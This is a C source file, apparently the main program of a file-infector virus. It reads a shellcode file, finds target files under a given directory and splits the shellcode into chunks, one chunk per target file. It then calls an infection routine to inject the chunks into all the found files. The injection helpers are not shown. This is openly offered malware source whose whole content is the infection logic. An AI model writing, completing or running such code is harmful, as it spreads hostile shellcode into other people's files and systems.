#include <stdio.h>
#include <fcntl.h>
#include "../includes/lists.h"
#include "../includes/utils.h"
#include "../includes/infection.h"

void *free_shellcode_chunks(t_shellcode **chunks) {
  if (!chunks)
    return (NULL);
  for (int i = 0; chunks[i] != NULL; i++) {
    if (chunks[i]) {
      if (chunks[i]->buf)
        free(chunks[i]->buf);
      free(chunks[i]);
    }
  }
  free(chunks);
  return (NULL);
}

t_shellcode **split_shellcode(t_shellcode *shellcode, size_t filecount) {
  int remainder = shellcode->length % filecount;
  int bytes_per_chunk = shellcode->length / filecount;
  size_t offset = 0;
  t_shellcode **chunks;

  chunks = calloc(filecount + 1, sizeof(t_shellcode *)); // + 1 so that the array has a null terminator.
  if (!chunks)
    return (NULL);
  for (size_t i = 0; i < filecount; i++) {
    chunks[i] = calloc(1, sizeof(t_shellcode));
    if (!chunks[i])
      return (free_shellcode_chunks(chunks));
  }
  chunks[0]->buf = calloc(bytes_per_chunk + remainder, sizeof(char));
  chunks[0]->length = bytes_per_chunk + remainder;
  memcpy(chunks[0]->buf, shellcode->buf, bytes_per_chunk + remainder);
  offset += (bytes_per_chunk + remainder);
  if (!chunks[0]->buf)
    return (free_shellcode_chunks(chunks));
  for (size_t i = 1; i < filecount; i++) {
    chunks[i]->buf = calloc(bytes_per_chunk, sizeof(char));
    if (!chunks[i])
      return (free_shellcode_chunks(chunks));
    memcpy(chunks[i]->buf, shellcode->buf + offset, bytes_per_chunk);
    offset += bytes_per_chunk;
    chunks[i]->length = bytes_per_chunk;
  }
  return (chunks);
}

// argv[1] path to begin infecting from, argv[2] path to shellcode.
int main(int argc, char *argv[]) {
  char *root_path;
  t_list *files;
  t_shellcode *shellcode;
  t_shellcode **chunks;
  FILE *fp;

  if (argc != 3)
    return (1);
  root_path = realpath(argv[1], NULL);
  if (!root_path)
    return (1);
  files = find_files(root_path);
  if (!files || !files->data)
    return (1);
  fp = fopen(argv[2], "rb");
  if (!fp) {
    perror(argv[2]);
    return (1);
  }
  shellcode = read_shellcode(fp);
  if (!shellcode) {
    perror(argv[2]);
    return (1);
  }
  chunks = split_shellcode(shellcode, list_count(files));
  if (!chunks) {
    perror(argv[2]);
    return (1);
  }
  fclose(fp);
  printf("Shellcode length (in bytes): %lu\n", shellcode->length);
  printf("Number of infectable files: %lu\n", list_count(files));
  printf("Shellcode length modulo Number of infectable files = %lu\n", shellcode->length % list_count(files));
  printf("Shellcode length / Number of infectable files = %lu\n", shellcode->length / list_count(files));
  infect_files(files, chunks, list_count(files));
  free_file_list(&files);
  free(shellcode->buf);
  free(shellcode);
  free(root_path);
  return (0);
}
